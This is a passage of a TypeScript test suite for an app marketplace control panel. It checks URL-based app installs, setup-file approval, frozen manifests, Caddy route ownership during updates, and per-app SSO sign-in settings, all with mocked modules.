  const manifest = { metadata: { id: 'demo', name: 'Demo', defaultSubdomain: 'demo' }, version: '1.0.0', setups,
    containers: [], secrets: [], capabilities: {} };
  const json = (body: unknown, init?: ResponseInit) => Response.json(body, init);
  const loaded = loadModule(file, {
    'next/server': { NextResponse: { json } },
    '@/lib/market/engine': { installApp: async (_manifest: unknown, config: Record<string, unknown>) => { started.push('install'); configs.push(config); } },
    '@/lib/market/url-app': {
      fetchUrlApp: async () => manifest, validateAppUrl: () => null, isPrivateHostname: () => false,
      resolveAppManifestUrl: (url: string) => url,
      UrlAppError: class extends Error { details: string[] = []; },
    },
    '@/lib/market/install-tracker': { startTracking: () => { started.push('tracking'); return new AbortController(); },
      trackEvent: () => {}, finishTracking: () => {}, logOperationFailure: () => {},
      sanitiseInstallEvent: (event: unknown) => event, sensitivitySafeInstallError: () => 'failed' },
    '@/lib/market/update-admission': freeLifecycle,
    '@/lib/market/installed-apps': { updateInstalledAppSource: async () => {} },
    '@/lib/health/notification-bridge': { sendNotificationToUI: async () => {} },
    '@/lib/settings': { settingsService: { getRaw: async () => ({ domain: 'example.test' }) } },
    '@/lib/auth/rbac': { requireAdmin: async () => ({ session: { username: 'owner' } }) },
    '@/lib/auth/session': { verifyCSRFToken: async () => true },
    '@/lib/admission/management': { admissionAdministrator: async () => INSTALLATION },
    '@/lib/market/direct-apps': { saveDirectMarketApp: async () => { started.push('saved'); return {}; } },
    '@/lib/market/source': marketSource,
  }, { Response, TextEncoder, ReadableStream });
  return { loaded, started, configs };
}

const post = (body: unknown) => new Request('https://cp.example.test/api', { method: 'POST', body: JSON.stringify(body) });

test('install-url refuses an app with setup files unless allowSetup is sent', async () => {
  const setups = [{ name: 'setup/sso.yaml', for: 'sso' }];
  const { loaded, started } = routeModule('app/api/market/install-url/route.ts', setups);
  const refused = await loaded.POST(post({ url: 'https://example.com/youeye-app.yaml', acceptUnverifiedPublisher: true }));
  assert.equal(refused.status, 400);
  const body = await refused.json();
  assert.match(body.error, /allowSetup/);
  assert.deepEqual(body.setups, setups);
  assert.deepEqual(started, []);

  const plain = routeModule('app/api/market/install-url/route.ts', []);
  const accepted = await plain.loaded.POST(post({ url: 'https://example.com/youeye-app.yaml', acceptUnverifiedPublisher: true }));
  assert.equal(accepted.status, 200);
  await accepted.text();
  assert.deepEqual(plain.started.slice(0, 3), ['saved', 'tracking', 'install']);
});

test('install-url passes the access choice only when one was made: a reinstall by URL keeps an opened policy (YE-168)', async () => {
  for (const [body, want] of [[{}, undefined], [{ publicAccess: true }, true], [{ publicAccess: false }, false]] as const) {
    const route = routeModule('app/api/market/install-url/route.ts', []);
    const answer = await route.loaded.POST(post({ url: 'https://example.com/youeye-app.yaml', acceptUnverifiedPublisher: true, ...body }));
    assert.equal(answer.status, 200);
    await answer.text();
    assert.equal(route.configs.length, 1);
    // Undefined: no explicit "only users", so the install never closes a policy an administrator opened; a URL app's
    // manifest default never opens one either (it is not the official catalog).
    assert.equal(route.configs[0].publicAccess, want, JSON.stringify(body));
  }
});

test('validate-url refuses to add an app with setup files unless allowSetup is sent', async () => {
  const setups = [{ name: 'setup/install.yaml', for: 'install' }];
  const { loaded, started } = routeModule('app/api/market/validate-url/route.ts', setups);
  const refused = await loaded.POST(post({ manifestUrl: 'https://example.com/youeye-app.yaml', addToMarket: true }));
  assert.equal(refused.status, 400);
  const body = await refused.json();
  assert.equal(body.setupApprovalRequired, true);
  assert.deepEqual(body.setups, setups);
  assert.deepEqual(started, []);
});

// ─── Frozen copies and internet ─────────────────────────────

test('paths acting on installed apps read the frozen copy, not the live catalog', () => {
  for (const file of [
    'src/lib/market/managed-ai.ts', 'src/lib/bridges/manager.ts', 'src/lib/bridges/suggestions.ts',
    'src/app/api/market/uninstall/route.ts', 'src/app/api/market/providers/route.ts', 'src/lib/market/ui-manifest-sync.ts',
    'src/app/api/suggestions/regenerate/route.ts', 'src/app/api/bridges/resolve/route.ts', 'src/lib/backup/app-restore.ts',
  ]) {
    assert.doesNotMatch(readFileSync(path.join(root, file), 'utf8'), /fetchManifest(FromSource)?\(/, file);
  }
  const ui = readFileSync(path.join(root, '../ui/src/app/api/v1/apps/register/route.ts'), 'utf8');
  assert.match(ui, /frozenCpManifest \?\? liveManifest/);
  const uiQueries = readFileSync(path.join(root, '../ui/src/lib/db/queries/app-management.ts'), 'utf8');
  assert.match(uiQueries, /existing\?\.manifest\?\.frozen && !manifest\.frozen/);
  assert.match(uiQueries, /delete manifest\.frozen/);
});

test('internet is an honest NAT boolean: no per-host allowlist remains', () => {
  for (const file of ['src/lib/market/types.ts', 'src/lib/market/engine.ts', 'src/lib/bridges/manager.ts',
    'src/lib/bridges/suggestions.ts', 'src/app/api/market/app/[appId]/connections/route.ts',
    '../ui/src/lib/internet/scopes.ts']) {
    assert.doesNotMatch(readFileSync(path.join(root, file), 'utf8'), /internet(\?)?\.hosts|hosts: string\[\];\n  proxy/, file);
  }
});

// ─── Exact route ownership (no app-<id>- prefixes) ──────────

test('the update ingress fence covers only routes to containers the install record names', async () => {
  const route = (id: string, host: string, dial: string) => ({ '@id': id, match: [{ host: [host] }],
    handle: [{ handler: 'reverse_proxy', upstreams: [{ dial }] }] });
  let config: any = { apps: { http: { servers: { srv0: { routes: [
    route('app-foo-main', 'foo.box.test', 'app-foo:8080'),
    route('route-7', 'alias.box.test', 'app-foo.youeye:8080'),
    route('app-foo-bar-web', 'foo-bar.box.test', 'app-foo-bar:8080'),
  ] } } } } };
  const plan = { metadata: { appId: 'foo', subdomain: 'foo', domain: 'box.test',
    containers: [{ name: 'main', containerName: 'app-foo', type: 'oci' }] } };
  const provider = loadModule('lib/market/update-provider.ts', {
    '@/lib/caddy/client': {
      getConfig: async () => structuredClone(config),
      setConfig: async (next: unknown) => { config = structuredClone(next); },
    },
    '@/lib/caddy/servers': { routeServers },
    '@/lib/caddy/serial': { withCaddyMutation: (work: () => Promise<unknown>) => work() },
    './update-workspace': {
      AppUpdateWorkspace: class { get() { return Buffer.from(JSON.stringify(plan)); } },
      updateDigest: () => 'digest',
    },
    './constants': { CONTAINER_DOMAIN: 'youeye' },
  });
  const instance = new provider.IncusAppUpdateProvider();
  (instance as any).load = () => plan;
  await (instance as any).ingress({ id: 'u1', appId: 'foo' }, true);
  const fence = config.apps.http.servers.srv0.routes[0];
  assert.equal(fence['@id'], 'app-update-foo');
  assert.deepEqual(fence.match[0].host.sort(), ['alias.box.test', 'foo.box.test']);
});

test('admission reconciliation does not claim routes by an app-<id>- prefix', () => {
  const lifecycle = readFileSync(path.join(root, 'src/lib/admission/lifecycle.ts'), 'utf8');
  const provider = readFileSync(path.join(root, 'src/lib/market/update-provider.ts'), 'utf8');
  for (const source of [lifecycle, provider]) assert.doesNotMatch(source, /startsWith\(`app-\$\{[^}]+\}-`\)/);
});

// ─── Sign-in setting after install ──────────────────────────

test('the sign-in setting is offered for installed apps with sso and setup/sso.yaml', async () => {
  const apps: Record<string, any> = {
    jellyfin: { meta: { appId: 'jellyfin', enableSSO: true, lifecycleState: 'active' },
      manifest: { sso: { callback_path: '/cb' }, setups: [{ for: 'sso' }] } },
    plain: { meta: { appId: 'plain', enableSSO: false, lifecycleState: 'active' }, manifest: { setups: [] } },
    envsso: { meta: { appId: 'envsso', enableSSO: true, lifecycleState: 'active' }, manifest: { sso: {}, setups: [] } },
  };
  const signIn = loadModule('lib/market/sign-in.ts', {
    './metadata': { readInstallMetadata: async (id: string) => apps[id]?.meta ?? null },
    './frozen-manifest': { readFrozenUpdateManifest: async (id: string) => apps[id].manifest },
    './setup-runner': { setupFor: (manifest: any, purpose: string) => manifest.setups.find((s: any) => s.for === purpose) },
  });
  assert.deepEqual({ ...await signIn.getAppSignIn('jellyfin') }, { appId: 'jellyfin', available: true, enabled: true });
  assert.deepEqual({ ...await signIn.getAppSignIn('plain') }, { appId: 'plain', available: false, enabled: false });
  assert.equal((await signIn.getAppSignIn('envsso')).available, false);
  await assert.rejects(signIn.getAppSignIn('missing'), /not installed/);

  const ui = readFileSync(path.join(root, 'src/components/settings-shell/apps-client.tsx'), 'utf8');
  assert.match(ui, /\/api\/market\/app\/\$\{encodeURIComponent\(appId\)\}\/sign-in`, \{\n\s+method: "PUT"/);
});

test('turning sign-in back on binds the new OAuth client to the app\'s admission policy', async () => {
  const meta: any = { appId: 'immich', subdomain: 'Photos', domain: 'box.test', enableSSO: false, lifecycleState: 'active' };
  const manifest = { metadata: { name: 'Immich' }, containers: [], sso: { callback_path: '/cb', additional_callbacks: [] }, setups: [{ for: 'sso' }] };
  const calls: string[] = [];
  const signIn = loadModule('lib/market/sign-in.ts', {
    '@/lib/admission/store': { ensureAppAdmission: async (input: any) => { calls.push(`admission ${input.clientId} ${input.routes[0].host} ${input.installed}`); } },
    '@/lib/identity/provider': {
      createOAuthClient: async (input: any) => { calls.push(`client ${input.clientId}`); return { clientId: input.clientId, clientSecret: 's' }; },
      removeOAuthClient: async (id: string) => { calls.push(`remove ${id}`); },
    },
    '@/lib/incus/app-network': { addSystemProxyDevices: async () => {}, applyAppEgressAcl: async () => {}, getSystemServices: async () => ({}) },
    './caddy-ca': { injectCaddyRootCA: async () => {} },
    './engine': { pushSsoEntryUrlToUI: async () => {} },
    './metadata': { readInstallMetadata: async () => meta, saveInstallMetadata: async () => { calls.push('saved'); } },
    './frozen-manifest': { readFrozenUpdateManifest: async () => manifest },
    './setup-context': { installedSsoClient: async () => null, installedSetupVariables: async () => ({}), setupContainers: () => ({}) },
    './setup-runner': { setupFor: (m: any, purpose: string) => m.setups.find((s: any) => s.for === purpose), runSetup: async () => { calls.push('setup'); return true; } },
    './update-admission': { withAppLifecycle: async (_id: string, run: () => unknown) => run() },
    './variables': { resolveVariables: (value: string) => value },
  });
  await signIn.setAppSignIn('immich', true);
  assert.deepEqual(calls, ['client youeye-app-immich', 'admission youeye-app-immich photos.box.test true', 'setup', 'saved']);
});
